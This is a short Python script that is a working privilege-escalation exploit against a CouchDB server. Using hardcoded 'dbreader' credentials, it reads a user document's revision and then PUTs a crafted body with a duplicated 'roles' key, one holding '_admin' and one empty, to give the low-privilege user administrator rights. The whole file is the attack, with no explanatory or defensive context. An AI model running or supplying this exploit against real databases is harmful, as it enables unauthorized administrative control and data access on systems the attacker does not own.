import requests

user = "dbreader"
password = "dbreader"
url = "http://%s:%s@localhost:5984" % (user, password)

user_doc_url = url + "/_users/org.couchdb.user:" + user

# first pull _rev
res = requests.get(user_doc_url)
rev = res.json()['_rev']

exploit = '{"_rev": "%s", "type": "user", "name": "%s", "roles": ["_admin"], "roles": []}' % (
    rev, user)

rcu = requests.put(user_doc_url, data=exploit)
print(rcu.json())
